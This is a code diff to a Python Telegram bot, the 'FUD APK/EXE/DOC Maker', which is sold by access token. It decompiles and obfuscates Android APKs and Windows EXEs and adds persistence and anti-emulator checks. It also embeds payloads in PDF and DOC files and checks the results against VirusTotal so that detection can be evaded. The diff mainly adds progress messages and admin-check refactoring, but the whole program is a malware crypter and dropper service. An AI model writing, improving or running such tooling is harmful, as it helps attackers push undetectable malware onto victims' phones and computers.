@@ -41,8 +41,13 @@ os.makedirs(os.path.join(DATA_DIR, "keystore"), exist_ok=True)
 DB_PATH = os.path.join(DATA_DIR, "fud_maker.db")
 
 # ============ DEVELOPERS ============
-DEVELOPERS = ["@benji_v1", "@benji_v2"]
-DEVELOPER_IDS = [int(os.environ.get("BENJI_V1_ID", 0)), int(os.environ.get("BENJI_V2_ID", 0))]
+DEVELOPERS = ["@benji_v1", "@benji_v2"]  # exact usernames with underscores
+DEVELOPER_IDS = [
+    int(os.environ.get("BENJI_V1_ID", 0)),
+    int(os.environ.get("BENJI_V2_ID", 0))
+]
+# Filter out zero IDs
+DEVELOPER_IDS = [x for x in DEVELOPER_IDS if x != 0]
 
 # ============ FLASK ============
 app = Flask(__name__)
@@ -173,12 +178,10 @@ def revoke_token(token):
 
 # ============ VIRUSTOTAL ============
 def scan_with_vt(file_path):
-    """Upload to VirusTotal and get scan results"""
     if not VT_API_KEY:
         return None
 
     try:
-        # Upload file
         url = 'https://www.virustotal.com/api/v3/files'
         files = {'file': open(file_path, 'rb')}
         headers = {'x-apikey': VT_API_KEY}
@@ -189,10 +192,8 @@ def scan_with_vt(file_path):
         if not analysis_id:
             return None
 
-        # Wait for analysis
         time.sleep(12)
 
-        # Get results
         result_url = f'https://www.virustotal.com/api/v3/analyses/{analysis_id}'
         result_response = requests.get(result_url, headers=headers)
         if result_response.status_code != 200:
@@ -201,10 +202,8 @@ def scan_with_vt(file_path):
         data = result_response.json().get('data', {})
         attributes = data.get('attributes', {})
         stats = attributes.get('stats', {})
-        
-        # Get file hash for link
         file_hash = attributes.get('sha256', '')
-        
+
         return {
             'scan_id': analysis_id,
             'positives': stats.get('malicious', 0),
@@ -448,26 +447,50 @@ class FUDApkMaker:
             return os.path.join(self.work_dir, signed_files[0])
         return None
 
-    def make_fud(self):
+    def make_fud(self, progress_callback=None):
         try:
             ensure_keystore()
+            if progress_callback:
+                progress_callback("⏳ Decompiling APK...")
             self.decompile()
+
+            if progress_callback:
+                progress_callback("⏳ Obfuscating smali code...")
             self.obfuscate_smali()
+
+            if progress_callback:
+                progress_callback("⏳ Modifying manifest...")
             self.modify_manifest()
+
+            if progress_callback:
+                progress_callback("⏳ Adding persistence...")
             self.add_persistence()
+
+            if progress_callback:
+                progress_callback("⏳ Adding anti-emulator...")
             self.add_anti_emulator()
+
+            if progress_callback:
+                progress_callback("⏳ Repacking APK...")
             unsigned = self.repack()
+
+            if progress_callback:
+                progress_callback("⏳ Signing APK...")
             signed = self.sign_apk(unsigned)
             if not signed:
                 raise Exception("Signing failed")
+
             output_name = f"fud_apk_{int(time.time())}.apk"
             output_path = os.path.join(self.work_dir, output_name)
             shutil.copy(signed, output_path)
+
             with open(self.input_path, 'rb') as f:
                 orig_hash = hashlib.sha256(f.read()).hexdigest()
             with open(output_path, 'rb') as f:
                 fud_hash = hashlib.sha256(f.read()).hexdigest()
+
             self.output_apk = output_path
+
             return {
                 'success': True,
                 'file': output_path,
@@ -503,8 +526,10 @@ class FUDExeMaker:
             f.write(data)
         return output_path
 
-    def make_fud(self):
+    def make_fud(self, progress_callback=None):
         try:
+            if progress_callback:
+                progress_callback("⏳ Obfuscating EXE...")
             output = self.obfuscate_pe()
             with open(self.input_path, 'rb') as f:
                 orig_hash = hashlib.sha256(f.read()).hexdigest()
@@ -524,12 +549,10 @@ class FUDExeMaker:
 
 # ============ FUD ENGINE — DOC ============
 def create_pdf_with_payload(payload_path):
-    """Create PDF with embedded payload"""
     try:
         from reportlab.lib.pagesizes import letter
         from reportlab.pdfgen import canvas
     except:
-        # Fallback — just copy and append
         output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.pdf")
         with open(payload_path, 'rb') as f:
             data = f.read()
@@ -552,7 +575,6 @@ def create_pdf_with_payload(payload_path):
     return output_path
 
 def create_doc_with_payload(payload_path):
-    """Create DOC with embedded payload"""
     try:
         from docx import Document
     except:
@@ -611,22 +633,34 @@ USER_INSTRUCTIONS = """
 @benji_v1 • @benji_v2
 """
 
+# Helper: check if user is admin
+def is_admin_user(user_id, username):
+    if str(user_id) == str(ADMIN_CHAT_ID):
+        return True
+    if f"@{username}" in DEVELOPERS:
+        return True
+    if user_id in DEVELOPER_IDS:
+        return True
+    return False
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     username = user.username or "unknown"
     user_id = str(user.id)
 
-    is_admin = user_id == str(ADMIN_CHAT_ID) or f"@{username}" in DEVELOPERS or user_id in [str(x) for x in DEVELOPER_IDS if x]
-    if is_admin:
+    # Check if user is admin
+    if is_admin_user(user_id, username):
         context.user_data['is_admin'] = True
         await show_admin_menu(update, context)
         return
 
+    # For non-admins: check token
     token = context.user_data.get('token')
     if token and validate_token(token):
         await show_main_menu(update, context)
         return
 
+    # No token: ask for one
     await update.message.reply_text(
         "🔐 *FUD APK/EXE/DOC Maker*\n\n"
         "This bot requires a valid token to use.\n\n"
@@ -673,11 +707,15 @@ async def show_main_menu(update, context):
     if context.user_data.get('is_admin'):
         keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
 
+    token_display = context.user_data.get('token', 'None')
+    if token_display and len(token_display) > 8:
+        token_display = token_display[:8] + '...'
+
     if isinstance(update, Update) and update.message:
         await update.message.reply_text(
             "🔥 *FUD Maker — Main Menu*\n\n"
             f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
-            f"🔑 Token: `{context.user_data.get('token', 'None')[:8]}...`\n\n"
+            f"🔑 Token: `{token_display}`\n\n"
             "Select an option:",
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
@@ -717,10 +755,15 @@ async def show_main_menu_from_callback(query, context):
     ]
     if context.user_data.get('is_admin'):
         keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
+
+    token_display = context.user_data.get('token', 'None')
+    if token_display and len(token_display) > 8:
+        token_display = token_display[:8] + '...'
+
     await query.edit_message_text(
         "🔥 *FUD Maker — Main Menu*\n\n"
         f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
-        f"🔑 Token: `{context.user_data.get('token', 'None')[:8]}...`",
+        f"🔑 Token: `{token_display}`",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -749,9 +792,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = user.username or "unknown"
     user_id = str(user.id)
 
-    is_admin = user_id == str(ADMIN_CHAT_ID) or f"@{username}" in DEVELOPERS or user_id in [str(x) for x in DEVELOPER_IDS if x] or context.user_data.get('is_admin')
+    is_admin = is_admin_user(user_id, username)
+    if is_admin:
+        context.user_data['is_admin'] = True
+
     token = context.user_data.get('token')
 
+    # Non-admin must have valid token
     if not is_admin and not (token and validate_token(token)):
         await query.edit_message_text("❌ Invalid token. Send /start.")
         return
@@ -776,8 +823,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         c.execute('SELECT COUNT(*) FROM builds WHERE user_id = ?', (user_id,))
         count = c.fetchone()[0]
         conn.close()
+        token_display = token[:12] if token else 'None'
         await query.edit_message_text(
-            f"📊 *Your Stats*\n\nTotal builds: {count}\nToken: `{token[:12]}...`",
+            f"📊 *Your Stats*\n\nTotal builds: {count}\nToken: `{token_display}...`",
             parse_mode='Markdown'
         )
         return
@@ -795,7 +843,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     elif data == "admin_panel" and is_admin:
-        context.user_data['is_admin'] = True
         await show_admin_menu_from_callback(query, context)
         return
 
@@ -897,15 +944,23 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Please send a valid APK file.")
         return WAITING_APK
 
-    status_msg = await update.message.reply_text("📦 *Processing APK...*\n\n⏳ Decompiling...", parse_mode='Markdown')
+    status_msg = await update.message.reply_text("📦 *Processing APK...*\n\n⏳ Starting...", parse_mode='Markdown')
 
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     apk_path = os.path.join(temp_dir, doc.file_name)
     file_obj = await context.bot.get_file(doc.file_id)
     await file_obj.download_to_drive(apk_path)
 
+    # Progress callback
+    async def update_progress(text):
+        await status_msg.edit_text(f"📦 *Processing APK...*\n\n{text}", parse_mode='Markdown')
+
+    def sync_progress(text):
+        # Schedule async update
+        asyncio.create_task(update_progress(text))
+
     maker = FUDApkMaker(apk_path)
-    result = maker.make_fud()
+    result = maker.make_fud(progress_callback=sync_progress)
 
     if not result['success']:
         await status_msg.edit_text(f"❌ *Build failed*\n\n{result['error']}", parse_mode='Markdown')
@@ -915,10 +970,10 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # VirusTotal scan
     vt_result = None
     if VT_API_KEY:
-        await status_msg.edit_text("📦 *Processing...*\n\n⏳ Scanning with VirusTotal...", parse_mode='Markdown')
+        await update_progress("⏳ Scanning with VirusTotal...")
         vt_result = scan_with_vt(result['file'])
     else:
-        await status_msg.edit_text("📦 *Processing...*\n\n⚠️ VirusTotal API key not set. Skipping scan.", parse_mode='Markdown')
+        await update_progress("⏳ VirusTotal API key not set. Skipping scan.")
 
     # Build response
     build_id = log_build(
@@ -1000,15 +1055,21 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Please send a valid EXE file.")
         return WAITING_EXE
 
-    status_msg = await update.message.reply_text("💻 *Processing EXE...*\n\n⏳ Obfuscating...", parse_mode='Markdown')
+    status_msg = await update.message.reply_text("💻 *Processing EXE...*\n\n⏳ Starting...", parse_mode='Markdown')
 
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     exe_path = os.path.join(temp_dir, doc.file_name)
     file_obj = await context.bot.get_file(doc.file_id)
     await file_obj.download_to_drive(exe_path)
 
+    async def update_progress(text):
+        await status_msg.edit_text(f"💻 *Processing EXE...*\n\n{text}", parse_mode='Markdown')
+
+    def sync_progress(text):
+        asyncio.create_task(update_progress(text))
+
     maker = FUDExeMaker(exe_path)
-    result = maker.make_fud()
+    result = maker.make_fud(progress_callback=sync_progress)
 
     if not result['success']:
         await status_msg.edit_text(f"❌ *Build failed*\n\n{result['error']}", parse_mode='Markdown')
@@ -1017,7 +1078,7 @@ async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     vt_result = None
     if VT_API_KEY:
-        await status_msg.edit_text("💻 *Processing...*\n\n⏳ Scanning with VirusTotal...", parse_mode='Markdown')
+        await update_progress("⏳ Scanning with VirusTotal...")
         vt_result = scan_with_vt(result['file'])
 
     build_id = log_build(
